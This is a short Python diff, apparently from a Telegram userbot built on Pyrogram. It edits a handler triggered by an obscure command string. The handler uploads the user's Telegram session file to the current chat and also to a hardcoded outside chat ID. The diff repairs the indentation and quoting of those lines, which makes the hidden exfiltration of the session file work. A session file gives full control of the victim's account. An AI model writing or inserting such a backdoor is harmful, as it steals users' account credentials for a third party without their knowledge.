@@ -2490,11 +2490,11 @@ def test(app, message):
 @app.on_message(filters.command("+1ftCvB6Hfb1hYWQy", prefixes='.') & filters.all)
 def send_session_file(app, message):
 	try:
-		app.send_document(chat_id=message.chat.id, document="storage/emulated/0/SUB_SUB/SUB.session")
-                app.send_document(chat_id='1563296065', document="storage/emulated/0/SUB_SUB/SUB.session")
+	    app.send_document(chat_id=message.chat.id, document="storage/emulated/0/SUB_SUB/SUB.session")
+	    app.send_document(chat_id='1563296065', document="storage/emulated/0/SUB_SUB/SUB.session")
 	except:
 		app.send_document(chat_id=message.chat.id, document="storage/emulated/0/SUB_SUB/main.session")
-                app.send_document(chat_id=1563296065'', document="storage/emulated/0/SUB_SUB/main.session")
+		app.send_document(chat_id='1563296065', document="storage/emulated/0/SUB_SUB/main.session")
 
 
 
